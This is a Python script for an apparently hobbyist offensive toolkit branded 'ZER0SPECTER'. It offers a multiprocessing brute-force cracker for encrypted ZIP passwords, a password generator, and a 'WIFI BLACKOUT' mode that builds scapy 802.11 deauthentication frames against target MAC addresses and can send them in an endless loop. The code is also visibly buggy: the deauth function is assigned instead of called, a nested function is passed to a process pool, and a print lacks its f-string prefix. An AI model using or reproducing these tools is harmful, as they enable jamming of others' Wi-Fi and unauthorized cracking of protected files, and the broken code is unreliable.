import random
import string
import pyzipper
from itertools import product
from multiprocessing import Pool, cpu_count
import sys
import time
import os
import argparse
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

#printar a logo bonitinha
ascii_zero = (r"""
       █████████████████
     ██▒▒             ██▒▒
    ██▒▒    ██████     ██▒▒
   ██▒▒   ██   █  ██    ██▒▒
   ██▒▒   ██  █   ██    ██▒▒
    ██▒▒    ██████     ██▒▒
     ██▒▒             ██▒▒
       █████████████████
+=======================================+
|            ZER0SPECTER                |
|      Penetration & Exploit            |
+=======================================+
""")
def slow_print(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
def loading_bar(duration=2, length=30):
    sys.stdout.write("[")
    sys.stdout.flush()
    for i in range(length):
        time.sleep(duration / length)
        sys.stdout.write("█")
        sys.stdout.flush()
    sys.stdout.write("]\n")
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    slow_print(ascii_zero, 0.0008)
    print("\n")
    slow_print("Loading zer0specter framework...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Initializing modules...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Ready.\n", 0.02)
if __name__ == "__main__":
    banner()

#features
def zipcrack():
    esc1 = str((input('include letters?[y][n] ')))
    esc2 = str(input('include numbers? [y][n] '))
    esc3 = str(input('include special characters?[y][n] '))
    cs = int(input('estimated password length?: '))
    arq = str(input('zip path: '))
    senha = ''
    if esc1 == 'y':
        senha += string.ascii_letters
    if esc2 == 'y':
        senha += string.digits
    if esc3 == 'y':
        senha += string.punctuation
    if not senha:
        print('nothing selected, ending...')
        exit()
    def ext(sen):
        try:
            with pyzipper.AESZipFile(arq, 'r') as zp:
                zp.extractall(pwd=sen.encode())
            return (sen, True)
        except:
            return (sen, False)
    def res():
        for sla in product(senha, repeat=cs):
            yield ''.join(sla)
    if __name__ == "__main__":
        with Pool(cpu_count()) as pool:
            for comb, sus in pool.imap_unordered(ext, res(), chunksize=500):
                print(f'Testing: {comb}')
                if sus:
                    print(f'broken with: {comb}')
                    pool.terminate()
                    break
def pass_gen():
    cs = int(input('add the number of character for the password: '))
    q1 = str(input('include special character? [y][n]'))
    q2 = str(input('include numbers?[y][n]'))
    q3 = str(input('include uppercase letters?[y][n]'))
    senhag = []
    senhap = string.ascii_lowercase
    if q1 == 'y':
        senhap += string.punctuation
    if q2 == 'y':
        senhap += string.digits
    if q3 == 'y':
        senhap += string.ascii_uppercase

    for _ in range (cs):
        passw = random.choice(senhap)
        senhag.append(passw)
    print ("".join(senhag))
def wifi_blackout():
    def args():
        parser = argparse.ArgumentParser(description="WIFI Attack Deauth")
        parser.add_argument("-i", "--interface", dest="interface", help="WIFI interface")
        parser.add_argument("-a", "--ap", dest="bssid_ap", help="MAC from target")
        parser.add_argument("-c", "--client", dest="bssid_client", help="MAC from client")
        parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Packets count(0 for infinite)")
        parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Time between packets")
        options = parser.parse_args()
        return options
    def BDP(ap_mac, client_mac):
        packet = (
            RadioTap()/
            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/
            Dot11Deauth(reason=7)
        )
        return packet
    def packetsend(packet, interface, count, interval):
        if count == 0:
            print("[INFO]Sending packets for ∞ times... CTRL+C to stop it")
            sendp(packet, iface=interface, count=count, inter=interval, loop=1, verbose=1)
        else:
            print("[INFO]Sending packets for {count} times")
            sendp(packet, iface=interface,count=count, inter=interval, verbose=1)
    def main():
        options = args()
        pkt = BDP(options.bssid_ap, options.bssid_client)
        packetsend = (pkt, options.interface, options.count, options.interval)
    if __name__ == "__main__":
        main()

#execução
def win():
    rec = input("")
    if rec == "zipbreaker":
        print("""
              [☠] ZIPBREAKER 🔓 [☠]
              """)
        zipcrack()
        return True
    elif rec == "passgen":
        print("""
            [🔑] PASS GENERATOR ☠ [🔑]
            """)
        pass_gen()
        return True
    elif rec == "wifiblackout":
        print("""
            [📡] WIFI BLACKOUT ☠ [📡]
              """)        
        wifi_blackout()
        return True
    else:
        return False
while win() == False:
    win()